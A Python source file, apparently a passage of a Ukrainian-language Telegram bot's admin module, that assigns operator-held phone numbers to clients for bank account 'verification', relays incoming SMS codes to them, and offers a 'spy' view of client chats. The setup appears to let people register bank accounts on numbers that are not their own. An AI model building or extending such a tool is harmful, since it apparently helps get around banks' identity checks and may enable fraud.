import os
import re
from aiogram import Router, F, Bot
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, FSInputFile
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from bot.config import ADMIN_ID, get_template_photo, get_bank_template_with_key
import bot.database as db

router = Router()

class AddLineStates(StatesGroup):
    waiting_id = State()
    waiting_phone = State()
    waiting_bank = State()

def get_admin_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text="🔌 Активні сесії"),
                KeyboardButton(text="📞 Статус ліній")
            ],
            [
                KeyboardButton(text="➕ Додати лінію"),
                KeyboardButton(text="🗑️ Очистити лінії")
            ]
        ],
        resize_keyboard=True
    )

# Фільтр для перевірки, що повідомлення або запит від Адміна
def is_admin(message_or_query) -> bool:
    return message_or_query.from_user.id == ADMIN_ID

async def clear_previous_admin_messages(chat_id: int, state: FSMContext, bot: Bot, key: str = "last_admin_messages"):
    """Видаляє попередні повідомлення адмін-меню для збереження чистоти чату"""
    if not state:
        return
    state_data = await state.get_data()
    msg_ids = state_data.get(key, [])
    for msg_id in msg_ids:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass
    await state.update_data(**{key: []})

async def clear_all_temp_admin_messages(chat_id: int, state: FSMContext, bot: Bot):
    """Видаляє всі тимчасові повідомлення (статуси, додавання ліній, очищення, сповіщення)"""
    if not state:
        return
    await clear_previous_admin_messages(chat_id, state, bot, "last_lines_messages")
    await clear_previous_admin_messages(chat_id, state, bot, "last_add_line_messages")
    await clear_previous_admin_messages(chat_id, state, bot, "last_clear_lines_messages")
    await clear_previous_admin_messages(chat_id, state, bot, "last_admin_messages")

async def register_admin_message(message_or_id, state: FSMContext, key: str = "last_admin_messages"):
    if not state:
        return
    msg_id = message_or_id if isinstance(message_or_id, int) else message_or_id.message_id
    state_data = await state.get_data()
    msg_ids = state_data.get(key, [])
    msg_ids.append(msg_id)
    await state.update_data(**{key: msg_ids})

async def clear_fsm_keep_messages(state: FSMContext):
    if not state:
        return
    state_data = await state.get_data()
    sessions_msgs = state_data.get("last_sessions_messages", [])
    lines_msgs = state_data.get("last_lines_messages", [])
    add_line_msgs = state_data.get("last_add_line_messages", [])
    clear_lines_msgs = state_data.get("last_clear_lines_messages", [])
    admin_msgs = state_data.get("last_admin_messages", [])
    
    await state.clear()
    
    await state.update_data(
        last_sessions_messages=sessions_msgs,
        last_lines_messages=lines_msgs,
        last_add_line_messages=add_line_msgs,
        last_clear_lines_messages=clear_lines_msgs,
        last_admin_messages=admin_msgs
    )

async def send_or_edit_bank_selection(
    bot: Bot,
    chat_id: int,
    state: FSMContext,
    line_id: int,
    phone: str,
    message_id: int = None
):
    data = await state.get_data()
    selected_banks = data.get("selected_banks", [])
    custom_banks = data.get("custom_banks", [])
    
    customOrder = ["bank.kd", "IziBank", "Alliance", "LvivBank", "AmoBank"]
    unique_banks = await db.get_unique_banks()
    all_banks = list(dict.fromkeys(customOrder + unique_banks + custom_banks))
    
    keyboard_buttons = []
    for b in all_banks:
        checkbox = "✅ " if b in selected_banks else ""
        keyboard_buttons.append([InlineKeyboardButton(text=f"{checkbox}{b}", callback_data=f"addlinebanktoggle_{b}")])
        
    keyboard_buttons.append([
        InlineKeyboardButton(text="📥 Зберегти", callback_data="addline_confirm"),
        InlineKeyboardButton(text="❌ Скасувати", callback_data="addline_cancel")
    ])
    
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    text = (
        f"Знайдено лінію: Line {line_id}, телефон +{phone}.\n\n"
        f"Оберіть банки зі списку нижче або введіть назву банку вручну:"
    )
    if selected_banks:
        text += f"\n\nОбрано: {', '.join(selected_banks)}"
        
    if message_id:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                reply_markup=markup
            )
        except Exception:
            msg = await bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=markup
            )
            msg_ids = data.get("last_add_line_messages", [])[:]
            if message_id in msg_ids:
                msg_ids.remove(message_id)
            msg_ids.append(msg.message_id)
            await state.update_data(last_add_line_messages=msg_ids)
    else:
        msg = await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=markup
        )
        await register_admin_message(msg, state, "last_add_line_messages")

@router.message(Command("lines"), F.from_user.id == ADMIN_ID)
async def cmd_list_lines(message: Message, state: FSMContext = None):
    """Показати список усіх ліній"""
    if not is_admin(message):
        return

    import aiosqlite
    from bot.config import DB_FILE
    
    async with aiosqlite.connect(DB_FILE) as db_conn:
        db_conn.row_factory = aiosqlite.Row
        async with db_conn.execute("SELECT * FROM lines ORDER BY id") as cursor:
            lines = await cursor.fetchall()

    if not lines:
        msg = await message.answer("Список ліній порожній. Додайте нові лінії за допомогою кнопки або надішліть номер телефону прямо в чат.")
    else:
        text = "Список ліній у базі:\n\n"
        for line in lines:
            status_text = "Вільна" if line['status'] == 'available' else "Зайнята"
            text += f"• Line {line['line_id']}: {line['phone_number']} ({line['bank']}) - {status_text}\n"
        msg = await message.answer(text)

    if state:
        await clear_all_temp_admin_messages(message.chat.id, state, message.bot)
        await clear_fsm_keep_messages(state)
        try:
            await message.delete()
        except Exception:
            pass
        await register_admin_message(msg, state, "last_lines_messages")

@router.message(Command("sessions"), F.from_user.id == ADMIN_ID)
async def cmd_list_sessions(message: Message, state: FSMContext = None):
    """Показати список активних сесій"""
    if not is_admin(message):
        return

    import aiosqlite
    from bot.config import DB_FILE
    
    async with aiosqlite.connect(DB_FILE) as db_conn:
        db_conn.row_factory = aiosqlite.Row
        async with db_conn.execute("SELECT * FROM sessions WHERE status != 'completed' ORDER BY created_at") as cursor:
            sessions = await cursor.fetchall()

    if not sessions:
        msg = await message.answer("Немає активних сесій верифікації на даний момент.", reply_markup=get_admin_keyboard())
        if state:
            await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_sessions_messages")
            await clear_all_temp_admin_messages(message.chat.id, state, message.bot)
            await clear_fsm_keep_messages(state)
            try:
                await message.delete()
            except Exception:
                pass
            await register_admin_message(msg, state, "last_sessions_messages")
        return

    msg_hdr = await message.answer("📋 <b>Активні сесії верифікації:</b>", parse_mode="HTML", reply_markup=get_admin_keyboard())
    
    import html
    cards_to_register = []
    for s in sessions:
        line_info = f"Line {s['line_id']}" if s['line_id'] else "Не призначено"
        selected_banks = s['selected_banks'] or "Не обрано"
        remaining_banks = s['remaining_banks'] or "Немає"
        
        username_esc = html.escape(s['username'] or "Невідомий")
        status_esc = html.escape(s['status'] or "")
        line_info_esc = html.escape(line_info)
        selected_banks_esc = html.escape(selected_banks)
        remaining_banks_esc = html.escape(remaining_banks)
        client_data_esc = html.escape(s['client_data'] or "")
        
        card_text = (
            f"👤 <b>Клієнт:</b> @{username_esc} (ID: <code>{s['client_id']}</code>)\n"
            f"• <b>Статус:</b> <code>{status_esc}</code>\n"
            f"• <b>Лінія:</b> {line_info_esc}\n"
            f"• <b>Обрані банки:</b> {selected_banks_esc}\n"
            f"• <b>Залишилось пройти:</b> {remaining_banks_esc}\n"
            f"• <b>Дані:</b> \n<pre>{client_data_esc}</pre>"
        )
        
        buttons = [
            [
                InlineKeyboardButton(text="💳 Банки", callback_data=f"managebanks_{s['client_id']}"),
                InlineKeyboardButton(text="📞 Лінія", callback_data=f"reassignline_{s['client_id']}")
            ],
            [
                InlineKeyboardButton(text="📖 Лог чату", callback_data=f"getlog_{s['client_id']}"),
                InlineKeyboardButton(text="👁️ Слідкувати", callback_data=f"spy_{s['client_id']}")
            ]
        ]
        
        if s['line_id']:
            buttons.append([
                InlineKeyboardButton(text="❌ Звільнити лінію", callback_data=f"unassignline_{s['client_id']}")
            ])
            
        buttons.append([
            InlineKeyboardButton(text="✅ Завершити сесію", callback_data=f"completesession_{s['client_id']}")
        ])
        
        markup = InlineKeyboardMarkup(inline_keyboard=buttons)
        msg_card = await message.answer(card_text, reply_markup=markup, parse_mode="HTML")
        cards_to_register.append(msg_card)

    if state:
        await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_sessions_messages")
        await clear_all_temp_admin_messages(message.chat.id, state, message.bot)
        await clear_fsm_keep_messages(state)
        try:
            await message.delete()
        except Exception:
            pass
        await register_admin_message(msg_hdr, state, "last_sessions_messages")
        for card in cards_to_register:
            await register_admin_message(card, state, "last_sessions_messages")

@router.message(Command("clear_lines"), F.from_user.id == ADMIN_ID)
async def cmd_clear_lines(message: Message, state: FSMContext = None):
    """Повне очищення бази даних ліній"""
    if not is_admin(message):
        return

    await db.clear_all_lines()
    msg = await message.answer("Список ліній повністю очищено.")

    if state:
        await clear_all_temp_admin_messages(message.chat.id, state, message.bot)
        await clear_fsm_keep_messages(state)
        try:
            await message.delete()
        except Exception:
            pass
        await register_admin_message(msg, state, "last_clear_lines_messages")

# --- Обробники текстових кнопок меню адміна ---

@router.message(F.text == "🔌 Активні сесії", F.from_user.id == ADMIN_ID)
async def btn_active_sessions(message: Message, state: FSMContext):
    await cmd_list_sessions(message, state)

@router.message(F.text == "📞 Статус ліній", F.from_user.id == ADMIN_ID)
async def btn_list_lines(message: Message, state: FSMContext):
    await cmd_list_lines(message, state)

@router.message(F.text == "🗑️ Очистити лінії", F.from_user.id == ADMIN_ID)
async def btn_clear_lines(message: Message, state: FSMContext):
    await cmd_clear_lines(message, state)

# Фільтр для визначення прямого вставлення формату лінії
def is_direct_line_format(message: Message) -> bool:
    if not message.text:
        return False
    text = message.text.strip()
    f1 = bool(re.match(r'^(?:Line\s+)?(\d+)\s+Return:\s*(\d+)(?:\s+(.+))?$', text, re.IGNORECASE))
    f2 = bool(re.match(r'^\+?(\d{10,15})\s+([a-zA-Z0-9\.\-_ ]+)$', text))
    f3 = bool(re.match(r'^\+?(\d{10,15})$', text))
    return f1 or f2 or f3

@router.message(F.text, F.from_user.id == ADMIN_ID, is_direct_line_format)
async def handle_direct_line_paste(message: Message, state: FSMContext):
    if not is_admin(message):
        return
    text = message.text.strip()
    
    match1 = re.match(r'^(?:Line\s+)?(\d+)\s+Return:\s*(\d+)(?:\s+(.+))?$', text, re.IGNORECASE)
    match2 = re.match(r'^\+?(\d{10,15})\s+([a-zA-Z0-9\.\-_ ]+)$', text)
    match3 = re.match(r'^\+?(\d{10,15})$', text)
    
    if match1:
        line_id = int(match1.group(1))
        phone = match1.group(2).strip().replace(' ', '').replace('-', '').replace('+', '')
        bank = match1.group(3).strip() if match1.group(3) else None
    elif match2:
        phone = match2.group(1).strip().replace(' ', '').replace('-', '').replace('+', '')
        bank = match2.group(2).strip()
        max_id = await db.get_max_line_id()
        line_id = max_id + 1
    elif match3:
        phone = match3.group(1).strip().replace(' ', '').replace('-', '').replace('+', '')
        bank = None
        max_id = await db.get_max_line_id()
        line_id = max_id + 1
    else:
        return

    try:
        await message.delete()
    except Exception:
        pass

    if bank:
        await clear_all_temp_admin_messages(message.chat.id, state, message.bot)
        await db.add_or_update_line(line_id, phone, bank)
        await clear_fsm_keep_messages(state)
        msg = await message.answer(
            f"✅ Лінію успішно додано:\n"
            f"• Line: {line_id}\n"
            f"• Телефон: +{phone}\n"
            f"• Банк: {bank}"
        )
        await register_admin_message(msg, state, "last_admin_messages")
        
        import asyncio
        await asyncio.sleep(3)
        try:
            await msg.delete()
        except Exception:
            pass
    else:
        await clear_all_temp_admin_messages(message.chat.id, state, message.bot)
        await clear_fsm_keep_messages(state)
        await state.update_data(line_id=line_id, phone=phone, selected_banks=[], custom_banks=[])
        await send_or_edit_bank_selection(message.bot, message.chat.id, state, line_id, phone)
        await state.set_state(AddLineStates.waiting_bank)

@router.message(F.text == "➕ Додати лінію", F.from_user.id == ADMIN_ID)
async def btn_add_line_start(message: Message, state: FSMContext):
    if not is_admin(message):
        return
    msg = await message.answer(
        "Введіть унікальний номер Line для нової лінії (ціле число):\n\n"
        "Для скасування надішліть /cancel"
    )
    await clear_all_temp_admin_messages(message.chat.id, state, message.bot)
    await clear_fsm_keep_messages(state)
    try:
        await message.delete()
    except Exception:
        pass
    await state.set_state(AddLineStates.waiting_id)
    await register_admin_message(msg, state, "last_add_line_messages")

@router.message(AddLineStates.waiting_id, F.from_user.id == ADMIN_ID)
async def add_line_id(message: Message, state: FSMContext):
    if message.text == "/cancel":
        msg = await message.answer("Додавання лінії скасовано.")
        await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_add_line_messages")
        await clear_fsm_keep_messages(state)
        try:
            await message.delete()
        except Exception:
            pass
        await register_admin_message(msg, state, "last_admin_messages")
        return
        
    line_id_str = message.text.strip()
    if not line_id_str.isdigit():
        msg = await message.answer("Номер Line має бути цілим числом. Спробуйте ще раз (або /cancel):")
        await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_add_line_messages")
        try:
            await message.delete()
        except Exception:
            pass
        await register_admin_message(msg, state, "last_add_line_messages")
        return
        
    line_id = int(line_id_str)
        
    await state.update_data(line_id=line_id)
    msg = await message.answer("Тепер введіть номер телефону (наприклад, +380961175562 або 380961175562):")
    await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_add_line_messages")
    try:
        await message.delete()
    except Exception:
        pass
    await register_admin_message(msg, state, "last_add_line_messages")
    await state.set_state(AddLineStates.waiting_phone)

@router.message(AddLineStates.waiting_phone, F.from_user.id == ADMIN_ID)
async def add_line_phone(message: Message, state: FSMContext):
    if message.text == "/cancel":
        msg = await message.answer("Додавання лінії скасовано.")
        await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_add_line_messages")
        await clear_fsm_keep_messages(state)
        try:
            await message.delete()
        except Exception:
            pass
        await register_admin_message(msg, state, "last_admin_messages")
        return
        
    phone = message.text.strip().replace(' ', '').replace('-', '').replace('+', '')
    if not phone.isdigit() or len(phone) < 9:
        msg = await message.answer("Неправильний формат телефону. Введіть ще раз (наприклад, 380961175562 або /cancel):")
        await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_add_line_messages")
        try:
            await message.delete()
        except Exception:
            pass
        await register_admin_message(msg, state, "last_add_line_messages")
        return
        
    await state.update_data(phone=phone, selected_banks=[], custom_banks=[])
    data = await state.get_data()
    line_id = data['line_id']
    
    await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_add_line_messages")
    try:
        await message.delete()
    except Exception:
        pass
        
    await send_or_edit_bank_selection(message.bot, message.chat.id, state, line_id, phone)
    await state.set_state(AddLineStates.waiting_bank)

@router.callback_query(F.data.startswith("addlinebanktoggle_"), AddLineStates.waiting_bank)
async def add_line_bank_toggle_callback(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback):
        return
    bank = callback.data.split("_", 1)[1]
    data = await state.get_data()
    selected_banks = data.get("selected_banks", [])[:]
    line_id = data['line_id']
    phone = data['phone']
    
    if bank in selected_banks:
        selected_banks.remove(bank)
    else:
        selected_banks.append(bank)
        
    await state.update_data(selected_banks=selected_banks)
    await send_or_edit_bank_selection(callback.bot, callback.message.chat.id, state, line_id, phone, callback.message.message_id)
    await callback.answer()

@router.callback_query(F.data == "addline_confirm", AddLineStates.waiting_bank)
async def add_line_confirm_callback(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback):
        return
    data = await state.get_data()
    selected_banks = data.get("selected_banks", [])
    if not selected_banks:
        await callback.answer("Оберіть хоча б один банк зі списку!", show_alert=True)
        return
        
    line_id = data['line_id']
    phone = data['phone']
    
    for bank in selected_banks:
        await db.add_or_update_line(line_id, phone, bank)
        
    banks_str = ", ".join(selected_banks)
    msg = await callback.message.answer(
        f"✅ Лінії успішно додано:\n"
        f"• Line: {line_id}\n"
        f"• Телефон: +{phone}\n"
        f"• Банки: {banks_str}"
    )
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_add_line_messages")
    await clear_fsm_keep_messages(state)
    await register_admin_message(msg, state, "last_admin_messages")
    await callback.answer()
    
    import asyncio
    await asyncio.sleep(3)
    try:
        await msg.delete()
    except Exception:
        pass

@router.callback_query(F.data == "addline_cancel", AddLineStates.waiting_bank)
async def add_line_cancel_callback(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback):
        return
    msg = await callback.message.answer("Додавання лінії скасовано.")
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_add_line_messages")
    await clear_fsm_keep_messages(state)
    await register_admin_message(msg, state, "last_admin_messages")
    await callback.answer()
    
    import asyncio
    await asyncio.sleep(3)
    try:
        await msg.delete()
    except Exception:
        pass

@router.message(AddLineStates.waiting_bank, F.from_user.id == ADMIN_ID)
async def add_line_bank_text(message: Message, state: FSMContext):
    if message.text == "/cancel":
        msg = await message.answer("Додавання лінії скасовано.")
        await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_add_line_messages")
        await clear_fsm_keep_messages(state)
        try:
            await message.delete()
        except Exception:
            pass
        await register_admin_message(msg, state, "last_admin_messages")
        
        import asyncio
        await asyncio.sleep(3)
        try:
            await msg.delete()
        except Exception:
            pass
        return
        
    bank = message.text.strip()
    if not bank:
        await clear_previous_admin_messages(message.chat.id, state, message.bot, "last_add_line_messages")
        msg = await message.answer("Назва банку не може бути порожньою. Введіть ще раз (або /cancel):")
        await register_admin_message(msg, state, "last_add_line_messages")
        return
        
    data = await state.get_data()
    line_id = data['line_id']
    phone = data['phone']
    custom_banks = data.get("custom_banks", [])[:]
    selected_banks = data.get("selected_banks", [])[:]
    
    if bank not in custom_banks:
        custom_banks.append(bank)
    if bank not in selected_banks:
        selected_banks.append(bank)
        
    await state.update_data(custom_banks=custom_banks, selected_banks=selected_banks)
    
    try:
        await message.delete()
    except Exception:
        pass
        
    msg_ids = data.get("last_add_line_messages", [])
    target_msg_id = msg_ids[-1] if msg_ids else None
    await send_or_edit_bank_selection(message.bot, message.chat.id, state, line_id, phone, target_msg_id)

# --- Callback обробники для Адміна ---

@router.callback_query(F.data.startswith("toggle_"))
async def handle_toggle_bank(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Адмін перемикає вибір банку для клієнта (чекбокси)"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")

    # Формат: toggle_{client_id}_{bank}
    parts = callback.data.split("_")
    client_id = int(parts[1])
    bank = parts[2]

    session = await db.get_session(client_id)
    if not session:
        await callback.answer("Сесію не знайдено.", show_alert=True)
        return

    selected_banks = session['selected_banks']
    selected = selected_banks.split(",") if selected_banks else []

    # Тоглимо вибір
    if bank in selected:
        selected.remove(bank)
    else:
        selected.append(bank)

    # Зберігаємо оновлений вибір (тільки selected_banks, не змінюючи remaining_banks)
    new_selected_str = ",".join(selected)
    import aiosqlite
    from bot.config import DB_FILE
    async with aiosqlite.connect(DB_FILE) as db_conn:
        await db_conn.execute("UPDATE sessions SET selected_banks = ? WHERE client_id = ?", (new_selected_str, client_id))
        await db_conn.commit()

    # Отримуємо унікальні назви банків з бази для перемальовування
    unique_banks_db = await db.get_unique_banks()
    custom_order = ["bank.kd", "IziBank", "Alliance", "LvivBank", "AmoBank"]
    all_banks = list(dict.fromkeys(custom_order + unique_banks_db))
    
    keyboard_buttons = []
    row = []
    for b in all_banks:
        checkbox = "[x]" if b in selected else "[ ]"
        button_text = f"{checkbox} {b}"
        callback_data = f"toggle_{client_id}_{b}"
        row.append(InlineKeyboardButton(text=button_text, callback_data=callback_data))
        if len(row) == 2:
            keyboard_buttons.append(row)
            row = []
    if row:
        keyboard_buttons.append(row)
        
    keyboard_buttons.append([
        InlineKeyboardButton(text="Назад", callback_data=f"backtosession_{client_id}"),
        InlineKeyboardButton(text="Зберегти", callback_data=f"savebanks_{client_id}")
    ])
    keyboard_buttons.append([InlineKeyboardButton(text="Відхилити запит", callback_data=f"reject_{client_id}")])
    
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)

    # Оновлюємо клавіатуру на повідомленні
    await callback.message.edit_reply_markup(reply_markup=markup)
    await callback.answer()

@router.callback_query(F.data.startswith("savebanks_"))
async def handle_save_banks(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Адмін зберігає вибір банків і переходить до першого призначення"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")

    client_id = int(callback.data.split("_")[1])
    
    session = await db.get_session(client_id)
    if not session:
        await callback.answer("Сесію не знайдено.", show_alert=True)
        return

    selected_banks = session['selected_banks']
    if not selected_banks:
        await callback.answer("Оберіть хоча б один банк для верифікації!", show_alert=True)
        return

    # Розраховуємо новий список залишкових банків без скидання прогресу
    state_data = await state.get_data()
    old_selected_str = state_data.get(f"old_selected_{client_id}")
    old_remaining_str = state_data.get(f"old_remaining_{client_id}")
    
    if session['status'] == 'registered' or old_selected_str is None:
        # Для нової сесії просто копіюємо обрані банки
        new_remaining_str = selected_banks
    else:
        # Для активної сесії оновлюємо залишкові банки розумно
        old_sel = old_selected_str.split(",") if old_selected_str else []
        old_rem = old_remaining_str.split(",") if old_remaining_str else []
        new_sel = selected_banks.split(",") if selected_banks else []
        
        # Починаємо з поточного списку залишкових банків
        new_rem = old_rem[:]
        
        # Додаємо нові банки, які щойно обрали
        for b in new_sel:
            if b not in old_sel and b not in new_rem:
                new_rem.append(b)
                
        # Видаляємо банки, які адмін зняв
        for b in old_rem:
            if b not in new_sel:
                try:
                    new_rem.remove(b)
                except ValueError:
                    pass
                    
        new_remaining_str = ",".join(new_rem)

    await db.update_session_banks(client_id, selected_banks, new_remaining_str)

    # Очищуємо збережені у стані тимчасові дані
    await state.update_data(**{
        f"old_selected_{client_id}": None,
        f"old_remaining_{client_id}": None
    })

    # Показуємо головну картку клієнта
    await show_session_card(callback.message, client_id, edit=True)
    await callback.answer()

@router.callback_query(F.data.startswith("assign_"))
async def handle_assign_line(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Адмін призначає лінію клієнту"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")

    parts = callback.data.split("_")
    client_id = int(parts[1])
    line_id = int(parts[2])

    # Отримуємо інформацію про лінію
    line_info = await db.get_line(line_id)
    if not line_info or line_info['status'] != 'available':
        await callback.answer("Ця лінія вже зайнята або не існує!", show_alert=True)
        return

    # Призначаємо лінію сесії
    await db.assign_line_to_session(client_id, line_id)

    # Редагуємо повідомлення призначення назад у картку сесії
    await show_session_card(callback.message, client_id, edit=True)

    # Сповіщаємо клієнта: спочатку надсилаємо інструкцію завантаження банку
    bank_name = line_info['bank']
    key, template = get_bank_template_with_key(bank_name)
    if template:
        photo_path = get_template_photo(key)
        instruction_msg = None
        if photo_path:
            try:
                instruction_msg = await bot.send_photo(
                    chat_id=client_id,
                    photo=FSInputFile(photo_path),
                    caption=template['text']
                )
            except Exception as e:
                print(f"Помилка надсилання фото шаблону банку: {e}")
                try:
                    instruction_msg = await bot.send_message(chat_id=client_id, text=template['text'])
                except Exception:
                    pass
        else:
            try:
                instruction_msg = await bot.send_message(chat_id=client_id, text=template['text'])
            except Exception as e:
                print(f"Помилка надсилання тексту шаблону банку: {e}")
        if instruction_msg:
            try:
                await db.update_session_instruction_message_id(client_id, instruction_msg.message_id)
            except Exception as e:
                print(f"Помилка оновлення instruction_message_id в БД: {e}")

    await bot.send_message(
        chat_id=client_id,
        text="Реєстрація робиться за моїм номером телефону, скажете коли потрібен буде СМС код"
    )

    client_msg = await bot.send_message(
        chat_id=client_id,
        text=f"`+{line_info['phone_number']}`",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )

    # Зберігаємо ID повідомлення з кнопкою у клієнта
    await db.update_session_message_id(client_id, client_msg.message_id)

    # Отримуємо інформацію про клієнта
    session_info = await db.get_session(client_id)
    if session_info and session_info.get('waiting_message_id'):
        try:
            await bot.delete_message(chat_id=client_id, message_id=session_info['waiting_message_id'])
        except Exception as e:
            print(f"Помилка видалення повідомлення очікування у клієнта: {e}")
    username = session_info['username'] if session_info else "Невідомий"

    # Відправляємо адміну повідомлення з кнопкою завершення сесії
    complete_markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔄 Завершити реєстрацію банку", callback_data=f"complete_release_{client_id}")
        ]
    ])

    confirm_msg = await callback.message.answer(
        text=(
            f"Лінію {line_info['line_id']} ({line_info['bank']}) призначено клієнту @{username}!\n\n"
            f"Клієнт може запрошувати коди необхідну кількість разів.\n"
            f"Коли потрібно буде достроково закінчити верифікацію, нажміть кнопку нижче."
        ),
        reply_markup=complete_markup,
        parse_mode="Markdown"
    )
    await register_admin_message(confirm_msg, state, "last_sessions_messages")
    await state.update_data(**{f"confirm_msg_{client_id}": confirm_msg.message_id})
    await callback.answer("Призначено!")

@router.callback_query(F.data.startswith("reject_"))
async def handle_reject_client(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Адмін відхиляє запит клієнта"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")

    client_id = int(callback.data.split("_")[1])

    # Закриваємо сесію
    await db.close_session(client_id)

    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer("Запит відхилено, сесію закрито.")
    await callback.answer("Запит відхилено.")

    # Повідомляємо клієнта
    await bot.send_message(
        chat_id=client_id,
        text="На жаль, ваш запит на верифікацію було відхилено адміністратором.",
        reply_markup=ReplyKeyboardRemove()
    )

@router.callback_query(F.data.startswith("route_"))
async def handle_route_code(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Адмін вручну перенаправляє код клієнту (Сценарій 3)"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")

    # Format: route_{client_id}_{code}
    parts = callback.data.split("_")
    client_id = int(parts[1])
    code = parts[2]

    session = await db.get_session(client_id)
    if not session or session['status'] != 'waiting_code':
        await callback.answer("Клієнт вже не очікує код або сесія закрита.", show_alert=True)
        return

    line_id = session['line_id']
    line_info = await db.get_line(line_id)
    line_num = line_info['line_id'] if line_info else line_id
    bank_name = line_info['bank'] if line_info else "Банк"

    # 1. Відправляємо код клієнту
    await db.increment_session_sent_codes_count(client_id)
    await bot.send_message(
        chat_id=client_id,
        text=f"`{code}`",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode="Markdown"
    )

    # 2. Повертаємо статус сесії на 'number_assigned'
    await db.set_session_status(client_id, 'number_assigned')

    # Видаляємо з веб-списку нерозподілених кодів
    try:
        from web.app import unrouted_codes
        for c in list(unrouted_codes):
            if c['code'] == code:
                unrouted_codes.remove(c)
    except Exception as e:
        print(f"Помилка видалення коду з веб-панелі: {e}")

    # 3. Оновлюємо повідомлення для адміна
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.edit_text(
        f"Код {code} перенаправлено користувачу @{session['username']} (Line {line_num} - {bank_name}).\n"
        f"Сесія залишається активною для наступних запитів.",
        parse_mode="Markdown"
    )
    await callback.answer("Код перенаправлено!")

@router.callback_query(F.data.startswith("complete_"))
async def handle_complete_session(callback: CallbackQuery, bot: Bot, state: FSMContext):
    """Адмін завершує верифікацію в поточному банку (успіх або відмова)"""
    if not is_admin(callback):
        await callback.answer("Доступ обмежено.", show_alert=True)
        return
    await clear_previous_admin_messages(callback.message.chat.id, state, callback.bot, "last_lines_messages")

    # Розпізнаємо тип результату
    parts = callback.data.split("_")
    if len(parts) >= 3:
        client_id = int(parts[2])
        result = parts[1] # "success", "failure", or "release"
    else:
        client_id = int(parts[1])
        result = "success"
    
    session = await db.get_session(client_id)
    if not session or session['status'] == 'completed':
        await callback.answer("Сесія вже завершена або не існує.", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        return

    line_id = session['line_id']
    line_info = await db.get_line(line_id)
    bank_name = line_info['bank'] if line_info else "Банк"

    # 1. Видаляємо кнопку запиту коду у клієнта
    if session['client_message_id']:
        try:
            await bot.edit_message_reply_markup(
                chat_id=client_id,
                message_id=session['client_message_id'],
                reply_markup=None
            )
        except Exception as e:
            print(f"Помилка видалення кнопки у клієнта: {e}")

    if result in ("success", "release"):
        # 2. Позначаємо лінію відповідно та логуємо завершення
        line_status = 'success' if result == 'success' else 'available'
        await db.set_line_status(line_id, line_status)
        await db.log_verification_end(client_id, bank_name, result)

        # Оновлюємо статус сесії в БД на 'registered' (без лінії)
        import aiosqlite
        from bot.config import DB_FILE
        async with aiosqlite.connect(DB_FILE) as db_conn:
            await db_conn.execute("UPDATE sessions SET line_id = NULL, client_message_id = NULL, status = 'registered' WHERE client_id = ?", (client_id,))
            await db_conn.commit()

        # 3. Вилучаємо пройдений bank зі списку залишкових банків
        remaining_banks_str = session['remaining_banks']
        remaining = remaining_banks_str.split(",") if remaining_banks_str else []
        if bank_name in remaining:
            remaining.remove(bank_name)

        new_remaining_str = ",".join(remaining)
        await db.update_session_banks(client_id, session['selected_banks'], new_remaining_str)

        # Прибираємо кнопки з повідомлення завершення
        await callback.message.edit_reply_markup(reply_markup=None)
        
        status_word = "Успішна" if result == "success" else "Вільна"
        await callback.message.edit_text(
            f"Верифікацію для клієнта @{session['username']} в банку {bank_name} завершено.\n"
            f"Лінія {line_id} позначена як {status_word}.",
            parse_mode="Markdown"
        )

        # 4. Перевіряємо чи залишилися ще банки для проходження
        if not remaining:
            try:
                kbd = ReplyKeyboardMarkup(
                    keyboard=[
                        [KeyboardButton(text="🔄 Розпочати знову")],
                        [KeyboardButton(text="📋 Мої дані")]
                    ],
